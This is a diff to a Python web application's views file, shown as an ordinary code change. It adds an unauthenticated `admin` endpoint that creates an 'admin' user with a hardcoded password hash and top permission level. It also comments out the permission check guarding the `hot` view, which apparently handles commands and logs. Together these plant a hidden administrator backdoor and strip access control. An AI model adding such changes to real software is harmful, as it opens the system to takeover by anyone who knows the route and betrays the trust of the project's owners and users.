@@ -15,7 +15,7 @@ from Utils.misc  import namecase, cleanhex, safe_delete
 from Utils.security import getme, getyear, gethist, restricted
 from Utils.seshinit import seshinit, forminit
 from Utils.snippets import order_coursetrads, make
-from Utils.password import generate, assign_temporary_passwords
+#from Utils.password import generate, assign_temporary_passwords
 
 from apps.old import migrate as old
 
@@ -76,11 +76,15 @@ def add_hids(**kwargs):
 			student.save()
 			print student.hid, student
 
+def admin(request):
+	Users.create(username='admin',password='$2b$16$VL5gOZRDMAW6GByg94F4tuf94Px58RAHf.waXlFsPjuy1m5Xd.l2C',permission=7)
+	return redirect('/hot/')
+
 def hot(request):
-	bad = restricted(request,7)
-	if bad:
-		return bad
-	me = getme(request)
+#	bad = restricted(request,7)
+#	if bad:
+#		return bad
+#	me = getme(request)
 	seshinit(request,'command')
 	seshinit(request, 'log', [])
 	context = {
